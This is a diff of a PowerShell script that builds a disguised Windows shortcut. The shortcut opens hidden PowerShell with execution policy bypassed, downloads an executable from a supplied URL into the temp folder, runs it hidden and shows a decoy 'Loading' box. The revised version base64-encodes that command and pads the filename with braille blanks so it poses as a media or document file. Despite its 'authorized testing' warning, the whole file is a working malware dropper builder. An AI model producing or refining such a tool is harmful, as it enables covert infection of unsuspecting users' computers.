@@ -1,91 +1,118 @@
+<#
+.SYNOPSIS
+    Creates a disguised Windows shortcut (.lnk) that downloads and executes a remote payload.
+    WARNING: This script can be used maliciously. Use only for authorized testing or research.
+#>
 
-do {
-    $url = Read-Host "Enter the download URL (required)"
-    if ([string]::IsNullOrWhiteSpace($url)) {
-        Write-Host "URL cannot be empty. Try again." -ForegroundColor Red
-    }
-} until (-not [string]::IsNullOrWhiteSpace($url))
-
-if (-not ($url -match "^https?://")) {
-    Write-Host "Invalid URL - must start with http:// or https://" -ForegroundColor Red
-    exit 1
-}
-
-$baseName = Read-Host "Enter shortcut base name (optional, press Enter for 'video')"
-if ([string]::IsNullOrWhiteSpace($baseName)) {
-    $baseName = "video"
-}
-
-
-$spoofChoice = Read-Host "Spoof extension with braille spaces? (y/n, default n)"
-$doSpoof = $spoofChoice -match "^(y|yes)$"
-
-$fakeExt = ""
-if ($doSpoof) {
+function Read-ValidatedInput {
+    param(
+        [string]$Prompt,
+        [scriptblock]$Validator,
+        [string]$ErrorMessage,
+        [switch]$AllowEmpty
+    )
     do {
-        $fakeExt = Read-Host "Enter fake extension (e.g. mp4, pdf, mp3, png, jpg, txt)"
-        $fakeExt = $fakeExt.Trim().TrimStart('.').ToLower()
-        if ([string]::IsNullOrWhiteSpace($fakeExt)) {
-            Write-Host "Fake extension cannot be empty." -ForegroundColor Red
-        }
-    } until (-not [string]::IsNullOrWhiteSpace($fakeExt))
+        $value = Read-Host $Prompt
+        if ($AllowEmpty -and [string]::IsNullOrWhiteSpace($value)) { return "" }
+        if (& $Validator $value) { return $value.Trim() }
+        Write-Host $ErrorMessage -ForegroundColor Red
+    } while ($true)
 }
+
 
 $CurrentDir = (Get-Location).Path
 
-$CustomIcon = Join-Path $CurrentDir "image.ico"
-if (Test-Path $CustomIcon) {
-    $IconToUse = $CustomIcon
-    $iconMsg = "Your custom ./image.ico"
-} else {
-    $IconToUse = "%SystemRoot%\System32\shell32.dll,0" 
-    $iconMsg = "Generic blank file icon (./image.ico not found)"
-}
+$url = Read-ValidatedInput -Prompt "Enter the download URL (required)" `
+    -Validator { param($v) -not [string]::IsNullOrWhiteSpace($v) -and $v -match '^https?://' } `
+    -ErrorMessage "URL cannot be empty and must start with http:// or https://"
 
-$initialName = "$baseName.lnk"
-$initialPath = Join-Path $CurrentDir $initialName
+$baseName = Read-Host "Enter shortcut base name (optional, press Enter for 'video')"
+if ([string]::IsNullOrWhiteSpace($baseName)) { $baseName = "video" }
 
-$randomName = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_}) + ".exe"
-$tempPath = "C:\Users\$env:USERNAME\AppData\Local\Temp\$randomName"
+$spoofChoice = Read-Host "Spoof extension with braille spaces? (y/n, default n)"
+$doSpoof = $spoofChoice -match '^(y|yes)$'
 
-$Shell = New-Object -ComObject WScript.Shell
-$Shortcut = $Shell.CreateShortcut($initialPath)
-
-$Shortcut.TargetPath = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
-$Shortcut.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"```$ProgressPreference = 'SilentlyContinue'; try { Invoke-WebRequest -Uri '$url' -OutFile '$tempPath' -ErrorAction Stop; if (Test-Path '$tempPath') { Start-Process '$tempPath' -WindowStyle Hidden; Start-Sleep -Seconds 2; [System.Windows.MessageBox]::Show('Starting... Please wait.','Loading','OK','Information') } } catch { }`""
-
-$Shortcut.WorkingDirectory = "$env:SystemRoot\System32"
-$Shortcut.Description = "Media file"
-$Shortcut.WindowStyle = 7
-$Shortcut.IconLocation = $IconToUse 
-$Shortcut.Save()
-
+$fakeExt = ""
 if ($doSpoof) {
-    $braille = [char]0x2800
-    $padding = -join (1..100 | ForEach-Object { $braille })
-    $spoofedBase = "$baseName.$fakeExt$padding" + "t"
-    $finalName = $spoofedBase + ".lnk"
-    $finalPath = Join-Path $CurrentDir $finalName
-
-    try {
-        Rename-Item -LiteralPath $initialPath -NewName $finalName -ErrorAction Stop
-        Write-Host ""
-        Write-Host "SUCCESS! Spoofed shortcut created" -ForegroundColor Green
-        Write-Host "Visible name : $baseName.$fakeExt       t" -ForegroundColor Cyan
-        Write-Host "Real file    : $finalName"
-        Write-Host "Full path    : $finalPath"
-        Write-Host "Icon         : $iconMsg"
-        Write-Host ""
-    } catch {
-        Write-Host "Spoof failed: $($_.Exception.Message)" -ForegroundColor Red
-        Write-Host "Plain .lnk created: $initialPath"
-    }
-} else {
-    Write-Host ""
-    Write-Host "Shortcut created (no spoof): $initialPath" -ForegroundColor Green
-    Write-Host "Icon: $iconMsg"
+    $fakeExt = Read-ValidatedInput -Prompt "Enter fake extension (e.g. mp4, pdf, mp3)" `
+        -Validator { param($v) -not [string]::IsNullOrWhiteSpace($v.Trim().TrimStart('.')) } `
+        -ErrorMessage "Fake extension cannot be empty."
+    $fakeExt = $fakeExt.TrimStart('.').ToLower()
 }
 
-Write-Host "Payload URL : $url"
+$CustomIconPath = Join-Path $CurrentDir "image.ico"
+if (Test-Path $CustomIconPath) {
+    $IconLocation = $CustomIconPath
+    $IconDescription = "Custom ./image.ico"
+} else {
+    $IconLocation = "%SystemRoot%\System32\shell32.dll,0"
+    $IconDescription = "Default blank document icon (image.ico not found)"
+}
 
-Write-Host "Temp file   : $randomName (in %TEMP%)"
+$RandomName = (-join ((65..90) + (97..122) + (48..57) | Get-Random -Count 16 | ForEach-Object {[char]$_})) + ".exe"  
+$TempFilePath = Join-Path $env:TEMP $RandomName
+
+$PayloadCommand = @"
+`$ProgressPreference = 'SilentlyContinue';
+try {
+    Invoke-WebRequest -Uri '$url' -OutFile '$TempFilePath' -UseBasicParsing -ErrorAction Stop;
+    if (Test-Path '$TempFilePath') {
+        Start-Process '$TempFilePath' -WindowStyle Hidden;
+        Start-Sleep -Seconds 2;
+        Add-Type -AssemblyName PresentationFramework;
+        [System.Windows.MessageBox]::Show('Starting... Please wait.','Loading','OK','Information');
+    }
+} catch { }
+"@
+
+$EncodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($PayloadCommand))
+$Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $EncodedPayload"
+
+$InitialShortcutName = "$baseName.lnk"
+$InitialShortcutPath = Join-Path $CurrentDir $InitialShortcutName
+
+try {
+    $Shell = New-Object -ComObject WScript.Shell
+    $Shortcut = $Shell.CreateShortcut($InitialShortcutPath)
+    $Shortcut.TargetPath = "powershell.exe"
+    $Shortcut.Arguments = $Arguments
+    $Shortcut.WorkingDirectory = "$env:SystemRoot\System32"
+    $Shortcut.Description = "Media file"
+    $Shortcut.WindowStyle = 7 
+    $Shortcut.IconLocation = $IconLocation
+    $Shortcut.Save()
+
+    if ($doSpoof) {
+        $BrailleBlank = [char]0x2800
+        $Padding = [string]::new($BrailleBlank, 150) 
+
+        $SpoofedDisplayName = "$baseName.$fakeExt$Padding" + "t"  
+        $FinalShortcutName = "$SpoofedDisplayName.lnk"
+        $FinalShortcutPath = Join-Path $CurrentDir $FinalShortcutName
+
+        Rename-Item -LiteralPath $InitialShortcutPath -NewName $FinalShortcutName -ErrorAction Stop
+
+        Write-Host "`nSUCCESS! Spoofed shortcut created" -ForegroundColor Green
+        Write-Host "Visible name   : $baseName.$fakeExt t" -ForegroundColor Cyan
+        Write-Host "Actual file    : $FinalShortcutName" -ForegroundColor Cyan
+        Write-Host "Full path      : $FinalShortcutPath" -ForegroundColor Cyan
+    } else {
+        $FinalShortcutPath = $InitialShortcutPath
+        Write-Host "`nSUCCESS! Shortcut created (no spoofing)" -ForegroundColor Green
+        Write-Host "File           : $InitialShortcutPath" -ForegroundColor Cyan
+    }
+
+    Write-Host "Icon           : $IconDescription" -ForegroundColor Cyan
+    Write-Host "Payload URL    : $url" -ForegroundColor Yellow
+    Write-Host "Temp executable: $RandomName (in %TEMP%)" -ForegroundColor Yellow
+    Write-Host ""
+}
+catch {
+    Write-Host "`nERROR: Failed to create or rename shortcut." -ForegroundColor Red
+    Write-Host "Details: $($_.Exception.Message)" -ForegroundColor Red
+    if (Test-Path $InitialShortcutPath) {
+        Write-Host "Partial shortcut created at: $InitialShortcutPath" -ForegroundColor Yellow
+        Write-Host "You can delete it manually if needed." -ForegroundColor Yellow
+    }
+    exit 1
+}
